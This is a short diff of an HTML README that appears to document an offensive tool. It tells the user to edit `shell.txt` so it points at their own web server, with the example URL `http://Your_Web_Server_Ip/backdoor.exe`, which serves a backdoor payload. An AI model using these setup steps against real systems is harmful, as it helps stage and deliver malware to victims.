@@ -15,7 +15,7 @@
  <li>Open `shell.txt` :</li>
         <pre><code>sudo nano shell.txt</code></pre>
 
- <li>Edit the `CH_me` in `shell.txt` with your Apache or Nginx server's IP address.</li>
-        <p>Replace `CH_me` with the IP address of your server, e.g.,</p>
-        <pre><code>CH_me=http://your_apache_or_nginx_ip/</code></pre>
+ <li>Edit the `Your_Web_Server_Ip` in `shell.txt` with your Apache or Nginx server's IP address.</li>
+        <p>Replace `Your_Web_Server_Ip` with the IP address of your server, e.g.,</p>
+        <pre><code>http://Your_Web_Server_Ip/backdoor.exe</code></pre>
 </ol>
